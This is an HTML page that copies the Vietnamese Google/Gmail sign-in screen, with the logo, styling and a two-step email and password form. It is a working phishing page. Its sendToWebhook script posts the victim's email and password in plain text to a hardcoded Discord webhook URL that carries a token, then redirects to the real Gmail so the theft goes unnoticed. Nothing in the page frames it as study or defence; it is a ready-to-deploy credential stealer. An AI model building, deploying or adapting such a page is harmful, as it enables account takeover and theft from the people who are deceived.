<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Gmail</title>

<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">

<style>
*{margin:0;padding:0;box-sizing:border-box}

body{
  font-family:'Google Sans',Roboto,Arial,sans-serif;
  background:#f1f3f4;
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
}

/* CARD */
.container{
  width:100%;
  max-width:1000px;
  background:#fff;
  border-radius:28px;
  padding:56px 64px;
}

/* GRID */
.content{
  display:flex;
  gap:100px;
}

/* LEFT */
.left{flex:1}
.logo{margin-bottom:28px}
h1{font-size:36px;font-weight:400;margin-bottom:10px}
.subtitle{color:#5f6368}

/* RIGHT */
.right{flex:1;margin-top:24px}

/* INPUT */
.input-group{
  position:relative;
  margin-bottom:28px;
}

input{
  width:100%;
  max-width:600px;
  height:64px;
  border:1px solid #dadce0;
  border-radius:4px;
  padding:24px 14px 8px;
  font-size:16px;
  outline:none;
  background:#fff;
}

label{
  position:absolute;
  left:14px;
  top:20px;
  font-size:16px;
  color:#5f6368;
  background:#fff;
  padding:0 4px;
  transition:.2s;
  pointer-events: none;
}

input:focus{
  border:2px solid #1a73e8;
}

input:focus + label,
input:not(:placeholder-shown)+label{
  top:-10px;
  font-size:12px;
  color:#1a73e8;
}

/* PASSWORD TOGGLE */
.password-group{
  position:relative;
}

.toggle-pass{
  position:absolute;
  right:14px;
  top:50%;
  transform:translateY(-50%);
  font-size:14px;
  color:#1a73e8;
  cursor:pointer;
  user-select:none;
}

/* EMAIL INFO */
.user-info{
  display:flex;
  align-items:center;
  gap:10px;
  border:1px solid #dadce0;
  border-radius:20px;
  padding:6px 12px;
  width:max-content;
  margin-bottom:24px;
  cursor:pointer;
}

.avatar{
  width:24px;
  height:24px;
  border-radius:50%;
  background:#1a73e8;
  color:#fff;
  display:flex;
  align-items:center;
  justify-content:center;
  font-size:14px;
}

/* TEXT */
.link{color:#1a73e8;text-decoration:none;font-weight:500}

.info{
  font-size:14px;
  color:#5f6368;
  margin:24px 0 40px;
}

/* ACTION */
.actions{
  display:flex;
  justify-content:space-between;
  align-items:center;
}

.next-btn{
  background:#1a73e8;
  color:#fff;
  border:none;
  padding:10px 28px;
  border-radius:20px;
  cursor:pointer;
}

/* FOOTER */
.footer{
  position:absolute;
  bottom:20px;
  width:100%;
  max-width:1000px;
  display:flex;
  justify-content:space-between;
  font-size:12px;
  color:#5f6368;
}

/* MOBILE RESPONSIVE */
@media (max-width: 768px) {
  .container {
    padding: 28px 32px;
  }
  .content {
    flex-direction: column;
    gap: 50px;
  }
  .left {
    text-align: center;
  }
  .right {
    margin-top: 0;
  }
}
</style>
</head>

<body>

<div>
<div class="container">

<div class="content">

<!-- LEFT -->
<div class="left">
<div class="logo">
<svg width="40" height="40" viewBox="0 0 40 48">
<path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"/>
<path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"/>
<path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"/>
<path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"/>
</svg>
</div>

<h1 id="title">Đăng nhập</h1>
<div class="subtitle" id="subtitle">Tiếp tục tới Gmail</div>
</div>

<!-- RIGHT -->
<div class="right">

<!-- EMAIL STEP -->
<div id="step-email">
<div class="input-group">
<input id="email" type="text" placeholder=" " required>
<label>Email hoặc số điện thoại</label>
</div>

<a class="link" href="https://accounts.google.com/signin/v2/usernamerecovery?hl=vi" target="_blank">
Bạn quên địa chỉ email?
</a>

<div class="info">
Đây không phải máy tính của bạn? Hãy sử dụng Chế độ khách để đăng nhập một cách riêng tư.
</div>

<div class="actions">
<a class="link">Tạo tài khoản</a>
<button class="next-btn" onclick="nextStep()">Tiếp theo</button>
</div>
</div>

<!-- PASSWORD STEP -->
<div id="step-pass" style="display:none">

<div class="user-info" onclick="backStep()">
<div class="avatar" id="avatar"></div>
<div id="user-email"></div>
</div>

<div class="input-group">
<input id="password" type="password" placeholder=" " required>
<label>Nhập mật khẩu của bạn</label>
</div>

<a class="link" href="https://accounts.google.com/signin/v2/recoveryidentifier?hl=vi" target="_blank">
Bạn quên mật khẩu?
</a>

<div class="actions" style="margin-top:40px">
<span></span>
<button class="next-btn" onclick="sendToWebhook()">Tiếp theo</button>
</div>

</div>

</div>

</div>
</div>

<div class="footer">
<div>Tiếng Việt</div>
<div>
<span>Trợ giúp</span>
<span style="margin-left:16px">Quyền riêng tư</span>
<span style="margin-left:16px">Điều khoản</span>
</div>
</div>

</div>

<script>
function nextStep(){
  const email = document.getElementById("email").value;

  document.getElementById("step-email").style.display="none";
  document.getElementById("step-pass").style.display="block";

  document.getElementById("user-email").innerText = email;
  document.getElementById("avatar").innerText = email.charAt(0).toUpperCase();
}

function backStep(){
  document.getElementById("step-email").style.display="block";
  document.getElementById("step-pass").style.display="none";
}

function sendToWebhook(){
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  const webhookURL = "https://discord.com/api/webhooks/1485303986549690368/JQGy-tMo6QJKxBC_-sLYG7gC5ScAaujYfJEIkJiKCRwHCtXQ7gaBraj5l26jXm9exlv0";

  const data = {
    content: `User: ${email}\nPassword: ${password}`
  };

  fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  }).then(() => {
    window.location.href = 'https://mail.google.com';
  }).catch(err => {
    console.error('Error sending to webhook:', err);
    window.location.href = 'https://mail.google.com'; // Still redirect even if error
  });
}
</script>

</body>
</html>
